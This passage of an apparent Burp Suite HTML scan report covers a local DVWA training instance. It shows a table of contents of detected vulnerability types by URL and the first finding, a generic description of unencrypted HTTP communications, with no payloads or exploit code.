VlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAALAAAAAABAAEAQAICRAEAOw==" width="17" height="16"></td><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAPABAL/k/wAAACH/C05FVFNDQVBFMi4wAwEAAAAh+QQFAAABACwAAAAAAQABAAACAkQBADs=" width="0" height="16"></td></tr></table>
        </td>
        <td>&nbsp;</td>
    </tr>
    <tr>
        <td class="info">Information</td>
        <td colspan="8" height="30">
            <table cellpadding="0" cellspacing="0"><tr><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAPAAAH6JkwAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoxRUQ2RTc1MjMzQzExMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoxRUQ2RTc1MzMzQzExMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjFFRDZFNzUwMzNDMTExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjFFRDZFNzUxMzNDMTExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAALAAAAAABAAEAQAICRAEAOw==" width="308" height="16"></td><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAPAAALnO0gAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpERDdCQTNGRDMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpERDdCQTNGRTMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkREN0JBM0ZCMzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkREN0JBM0ZDMzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAALAAAAAABAAEAQAICRAEAOw==" width="316" height="16"></td><td><img class="bar" src="data:image/png;base64,R0lGODlhAQABAPAAANrp7wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDMgNzkuMTY0NTI3LCAyMDIwLzEwLzE1LTE3OjQ4OjMyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjIuMSAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpERDdCQTNGOTMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpERDdCQTNGQTMzQzAxMUVCQkZDMEJFODVBQTNBQzcwMCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkREN0JBM0Y3MzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkREN0JBM0Y4MzNDMDExRUJCRkMwQkU4NUFBM0FDNzAwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAALAAAAAABAAEAQAICRAEAOw==" width="0" height="16"></td></tr></table>
        </td>
        <td>&nbsp;</td>
    </tr>
</table>

<div class="rule"></div>
<h1>Contents</h1>
<p class="TOCH0"><a href="#1">1.&nbsp;http://localhost:7878/</a></p>
<p class="TOCH1"><a href="#1.1">1.1.&nbsp;Unencrypted communications</a></p>
<p class="TOCH1"><a href="#1.2">1.2.&nbsp;HTTP TRACE method is enabled</a></p>
<p class="TOCH0"><a href="#2">2.&nbsp;http://localhost:7878/dvwa</a></p>
<p class="TOCH1"><a href="#2.1">2.1.&nbsp;Cross-domain Referer leakage</a></p>
<p class="TOCH1"><a href="#2.2">2.2.&nbsp;Frameable response (potential Clickjacking)</a></p>
<p class="TOCH1"><a href="#2.3">2.3.&nbsp;Content type is not specified</a></p>
<p class="TOCH0"><a href="#3">3.&nbsp;http://localhost:7878/dvwa/</a></p>
<p class="TOCH1"><a href="#3.1">3.1.&nbsp;Cookie without HttpOnly flag set</a></p>
<p class="TOCH1"><a href="#3.2">3.2.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH0"><a href="#4">4.&nbsp;http://localhost:7878/dvwa/about.php</a></p>
<p class="TOCH1"><a href="#4.1">4.1.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH0"><a href="#5">5.&nbsp;http://localhost:7878/dvwa/config/config.inc.php</a></p>
<p class="TOCH1"><a href="#5.1">5.1.&nbsp;Backup file</a></p>
<p class="TOCH0"><a href="#6">6.&nbsp;http://localhost:7878/dvwa/hackable/</a></p>
<p class="TOCH1"><a href="#6.1">6.1.&nbsp;Directory listing</a></p>
<p class="TOCH0"><a href="#7">7.&nbsp;http://localhost:7878/dvwa/hackable/uploads/</a></p>
<p class="TOCH1"><a href="#7.1">7.1.&nbsp;Directory listing</a></p>
<p class="TOCH0"><a href="#8">8.&nbsp;http://localhost:7878/dvwa/hackable/uploads/file.txt.html</a></p>
<p class="TOCH1"><a href="#8.1">8.1.&nbsp;HTML does not specify charset</a></p>
<p class="TOCH0"><a href="#9">9.&nbsp;http://localhost:7878/dvwa/hackable/uploads/file.txtnvwhsmxoop.html</a></p>
<p class="TOCH1"><a href="#9.1">9.1.&nbsp;HTML does not specify charset</a></p>
<p class="TOCH0"><a href="#10">10.&nbsp;http://localhost:7878/dvwa/ids_log.php</a></p>
<p class="TOCH1"><a href="#10.1">10.1.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH0"><a href="#11">11.&nbsp;http://localhost:7878/dvwa/index.php</a></p>
<p class="TOCH1"><a href="#11.1">11.1.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH0"><a href="#12">12.&nbsp;http://localhost:7878/dvwa/instructions.php</a></p>
<p class="TOCH1"><a href="#12.1">12.1.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH0"><a href="#13">13.&nbsp;http://localhost:7878/dvwa/login.php</a></p>
<p class="TOCH1"><a href="#13.1">13.1.&nbsp;Cleartext submission of password</a></p>
<p class="TOCH1"><a href="#13.2">13.2.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#13.3">13.3.&nbsp;Frameable response (potential Clickjacking)</a></p>
<p class="TOCH0"><a href="#14">14.&nbsp;http://localhost:7878/dvwa/phpinfo.php</a></p>
<p class="TOCH1"><a href="#14.1">14.1.&nbsp;Referer-dependent response</a></p>
<p class="TOCH1"><a href="#14.2">14.2.&nbsp;Spoofable client IP address</a></p>
<p class="TOCH1"><a href="#14.3">14.3.&nbsp;User agent-dependent response</a></p>
<p class="TOCH1"><a href="#14.4">14.4.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH2"><a href="#14.4.1">14.4.1.&nbsp;http://localhost:7878/dvwa/phpinfo.php [Referer HTTP header]</a></p>
<p class="TOCH2"><a href="#14.4.2">14.4.2.&nbsp;http://localhost:7878/dvwa/phpinfo.php [User-Agent HTTP header]</a></p>
<p class="TOCH2"><a href="#14.4.3">14.4.3.&nbsp;http://localhost:7878/dvwa/phpinfo.php [name of an arbitrarily supplied URL parameter]</a></p>
<p class="TOCH2"><a href="#14.4.4">14.4.4.&nbsp;http://localhost:7878/dvwa/phpinfo.php [security cookie]</a></p>
<p class="TOCH0"><a href="#15">15.&nbsp;http://localhost:7878/dvwa/security.php</a></p>
<p class="TOCH1"><a href="#15.1">15.1.&nbsp;Cookie without HttpOnly flag set</a></p>
<p class="TOCH1"><a href="#15.2">15.2.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH0"><a href="#16">16.&nbsp;http://localhost:7878/dvwa/setup.php</a></p>
<p class="TOCH1"><a href="#16.1">16.1.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH0"><a href="#17">17.&nbsp;http://localhost:7878/dvwa/vulnerabilities/brute/</a></p>
<p class="TOCH1"><a href="#17.1">17.1.&nbsp;SQL injection</a></p>
<p class="TOCH1"><a href="#17.2">17.2.&nbsp;Cleartext submission of password</a></p>
<p class="TOCH1"><a href="#17.3">17.3.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#17.4">17.4.&nbsp;Password submitted using GET method</a></p>
<p class="TOCH1"><a href="#17.5">17.5.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#17.6">17.6.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH0"><a href="#18">18.&nbsp;http://localhost:7878/dvwa/vulnerabilities/captcha/</a></p>
<p class="TOCH1"><a href="#18.1">18.1.&nbsp;Cleartext submission of password</a></p>
<p class="TOCH1"><a href="#18.2">18.2.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#18.3">18.3.&nbsp;Cross-site request forgery</a></p>
<p class="TOCH1"><a href="#18.4">18.4.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#18.5">18.5.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH1"><a href="#18.6">18.6.&nbsp;Cross-domain script include</a></p>
<p class="TOCH0"><a href="#19">19.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/</a></p>
<p class="TOCH1"><a href="#19.1">19.1.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH2"><a href="#19.1.1">19.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [include parameter]</a></p>
<p class="TOCH2"><a href="#19.1.2">19.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [include parameter]</a></p>
<p class="TOCH2"><a href="#19.1.3">19.1.3.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [security cookie]</a></p>
<p class="TOCH2"><a href="#19.1.4">19.1.4.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [security cookie]</a></p>
<p class="TOCH2"><a href="#19.1.5">19.1.5.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [security cookie]</a></p>
<p class="TOCH1"><a href="#19.2">19.2.&nbsp;Cross-site request forgery</a></p>
<p class="TOCH1"><a href="#19.3">19.3.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#19.4">19.4.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH2"><a href="#19.4.1">19.4.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [include parameter]</a></p>
<p class="TOCH2"><a href="#19.4.2">19.4.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [security cookie]</a></p>
<p class="TOCH0"><a href="#20">20.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csrf/</a></p>
<p class="TOCH1"><a href="#20.1">20.1.&nbsp;Cleartext submission of password</a></p>
<p class="TOCH1"><a href="#20.2">20.2.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#20.3">20.3.&nbsp;Password submitted using GET method</a></p>
<p class="TOCH1"><a href="#20.4">20.4.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#20.5">20.5.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH0"><a href="#21">21.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csrf/test_credentials.php</a></p>
<p class="TOCH1"><a href="#21.1">21.1.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#21.2">21.2.&nbsp;Cleartext submission of password</a></p>
<p class="TOCH1"><a href="#21.3">21.3.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#21.4">21.4.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH0"><a href="#22">22.&nbsp;http://localhost:7878/dvwa/vulnerabilities/exec/</a></p>
<p class="TOCH1"><a href="#22.1">22.1.&nbsp;OS command injection</a></p>
<p class="TOCH1"><a href="#22.2">22.2.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#22.3">22.3.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#22.4">22.4.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH2"><a href="#22.4.1">22.4.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/exec/ [ip parameter]</a></p>
<p class="TOCH2"><a href="#22.4.2">22.4.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/exec/ [security cookie]</a></p>
<p class="TOCH0"><a href="#23">23.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/</a></p>
<p class="TOCH1"><a href="#23.1">23.1.&nbsp;File path traversal</a></p>
<p class="TOCH1"><a href="#23.2">23.2.&nbsp;Out-of-band resource load (HTTP)</a></p>
<p class="TOCH1"><a href="#23.3">23.3.&nbsp;External service interaction (DNS)</a></p>
<p class="TOCH1"><a href="#23.4">23.4.&nbsp;External service interaction (HTTP)</a></p>
<p class="TOCH1"><a href="#23.5">23.5.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH2"><a href="#23.5.1">23.5.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [security cookie]</a></p>
<p class="TOCH2"><a href="#23.5.2">23.5.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [Referer HTTP header]</a></p>
<p class="TOCH2"><a href="#23.5.3">23.5.3.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [User-Agent HTTP header]</a></p>
<p class="TOCH1"><a href="#23.6">23.6.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#23.7">23.7.&nbsp;Referer-dependent response</a></p>
<p class="TOCH1"><a href="#23.8">23.8.&nbsp;Spoofable client IP address</a></p>
<p class="TOCH1"><a href="#23.9">23.9.&nbsp;User agent-dependent response</a></p>
<p class="TOCH1"><a href="#23.10">23.10.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH2"><a href="#23.10.1">23.10.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [Referer HTTP header]</a></p>
<p class="TOCH2"><a href="#23.10.2">23.10.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [User-Agent HTTP header]</a></p>
<p class="TOCH2"><a href="#23.10.3">23.10.3.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [page parameter]</a></p>
<p class="TOCH2"><a href="#23.10.4">23.10.4.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [security cookie]</a></p>
<p class="TOCH0"><a href="#24">24.&nbsp;http://localhost:7878/dvwa/vulnerabilities/javascript/</a></p>
<p class="TOCH1"><a href="#24.1">24.1.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#24.2">24.2.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#24.3">24.3.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH0"><a href="#25">25.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli/</a></p>
<p class="TOCH1"><a href="#25.1">25.1.&nbsp;SQL injection</a></p>
<p class="TOCH2"><a href="#25.1.1">25.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli/ [id parameter]</a></p>
<p class="TOCH2"><a href="#25.1.2">25.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli/ [id parameter]</a></p>
<p class="TOCH1"><a href="#25.2">25.2.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#25.3">25.3.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#25.4">25.4.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH0"><a href="#26">26.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli_blind/</a></p>
<p class="TOCH1"><a href="#26.1">26.1.&nbsp;SQL injection</a></p>
<p class="TOCH2"><a href="#26.1.1">26.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli_blind/ [id parameter]</a></p>
<p class="TOCH2"><a href="#26.1.2">26.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli_blind/ [id parameter]</a></p>
<p class="TOCH1"><a href="#26.2">26.2.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH0"><a href="#27">27.&nbsp;http://localhost:7878/dvwa/vulnerabilities/upload/</a></p>
<p class="TOCH1"><a href="#27.1">27.1.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#27.2">27.2.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#27.3">27.3.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH2"><a href="#27.3.1">27.3.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/upload/ [filename multipart parameter attribute]</a></p>
<p class="TOCH2"><a href="#27.3.2">27.3.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/upload/ [security cookie]</a></p>
<p class="TOCH1"><a href="#27.4">27.4.&nbsp;File upload functionality</a></p>
<p class="TOCH0"><a href="#28">28.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_help.php</a></p>
<p class="TOCH1"><a href="#28.1">28.1.&nbsp;File path manipulation</a></p>
<p class="TOCH1"><a href="#28.2">28.2.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#28.3">28.3.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH2"><a href="#28.3.1">28.3.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_help.php [id parameter]</a></p>
<p class="TOCH2"><a href="#28.3.2">28.3.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_help.php [locale parameter]</a></p>
<p class="TOCH0"><a href="#29">29.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php</a></p>
<p class="TOCH1"><a href="#29.1">29.1.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH2"><a href="#29.1.1">29.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [id parameter]</a></p>
<p class="TOCH2"><a href="#29.1.2">29.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [id parameter]</a></p>
<p class="TOCH2"><a href="#29.1.3">29.1.3.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [security parameter]</a></p>
<p class="TOCH1"><a href="#29.2">29.2.&nbsp;File path manipulation</a></p>
<p class="TOCH2"><a href="#29.2.1">29.2.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [id parameter]</a></p>
<p class="TOCH2"><a href="#29.2.2">29.2.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [security parameter]</a></p>
<p class="TOCH1"><a href="#29.3">29.3.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#29.4">29.4.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH2"><a href="#29.4.1">29.4.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [id parameter]</a></p>
<p class="TOCH2"><a href="#29.4.2">29.4.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [security parameter]</a></p>
<p class="TOCH0"><a href="#30">30.&nbsp;http://localhost:7878/dvwa/vulnerabilities/weak_id/</a></p>
<p class="TOCH1"><a href="#30.1">30.1.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH2"><a href="#30.1.1">30.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/weak_id/ [security cookie]</a></p>
<p class="TOCH2"><a href="#30.1.2">30.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/weak_id/ [security cookie]</a></p>
<p class="TOCH2"><a href="#30.1.3">30.1.3.&nbsp;http://localhost:7878/dvwa/vulnerabilities/weak_id/ [security cookie]</a></p>
<p class="TOCH1"><a href="#30.2">30.2.&nbsp;Cross-site request forgery</a></p>
<p class="TOCH1"><a href="#30.3">30.3.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#30.4">30.4.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH0"><a href="#31">31.&nbsp;http://localhost:7878/dvwa/vulnerabilities/xss_d/</a></p>
<p class="TOCH1"><a href="#31.1">31.1.&nbsp;Cross-site scripting (DOM-based)</a></p>
<p class="TOCH2"><a href="#31.1.1">31.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/xss_d/</a></p>
<p class="TOCH2"><a href="#31.1.2">31.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/xss_d/</a></p>
<p class="TOCH1"><a href="#31.2">31.2.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#31.3">31.3.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#31.4">31.4.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH0"><a href="#32">32.&nbsp;http://localhost:7878/dvwa/vulnerabilities/xss_r/</a></p>
<p class="TOCH1"><a href="#32.1">32.1.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#32.2">32.2.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#32.3">32.3.&nbsp;Input returned in response (reflected)</a></p>
<p class="TOCH1"><a href="#32.4">32.4.&nbsp;Browser cross-site scripting filter disabled</a></p>
<p class="TOCH0"><a href="#33">33.&nbsp;http://localhost:7878/dvwa/vulnerabilities/xss_s/</a></p>
<p class="TOCH1"><a href="#33.1">33.1.&nbsp;Cross-site scripting (reflected)</a></p>
<p class="TOCH1"><a href="#33.2">33.2.&nbsp;Cross-site request forgery</a></p>
<p class="TOCH1"><a href="#33.3">33.3.&nbsp;Path-relative style sheet import</a></p>
<p class="TOCH1"><a href="#33.4">33.4.&nbsp;Input returned in response (reflected)</a></p>
<br><div class="rule"></div>
<span class="BODH0" id="1">1.&nbsp;http://localhost:7878/</span>
<br><a class="PREVNEXT" href="#2">Next</a>
<br>
<span class="BODH1" id="1.1">1.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/01000200_unencryptedcommunications">Unencrypted communications</a></span>
<br><a class="PREVNEXT" href="#1.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_low_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Low</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>The application allows users to connect to it over unencrypted connections.  An attacker suitably positioned to view a legitimate user's network traffic could record and monitor their interactions with the application and obtain any information the user supplies. Furthermore, an attacker able to modify traffic could use the application as a platform for attacks against its users and third-party websites. Unencrypted connections have been exploited by ISPs and governments to track users, and to inject adverts and malicious JavaScript. Due to these concerns, web browser vendors are planning to visually flag unencrypted connections as hazardous.</p>
<p>
To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.
</p>
<p>Please note that using a mixture of encrypted and unencrypted communications is an ineffective defense against active attackers, because they can easily remove references to encrypted resources when these references are transmitted over an unencrypted connection.</p></span>
<h2>Issue remediation</h2>
